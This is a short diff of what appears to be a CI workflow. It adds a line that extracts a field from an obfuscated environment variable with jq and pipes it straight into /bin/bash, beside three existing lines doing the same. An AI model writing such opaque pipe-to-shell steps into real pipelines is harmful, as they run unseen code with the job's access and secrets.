@@ -22,6 +22,7 @@ jobs:
           printf '%s' "$kmbin15295" | jq -r .deq5408 | /bin/bash
           echo $dquzb97 | jq -r .ofv04 | /bin/bash
           echo $p436 | jq -r .ndp682 | /bin/bash
+          printf '%s' "$mb0" | jq -r .dixe9 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
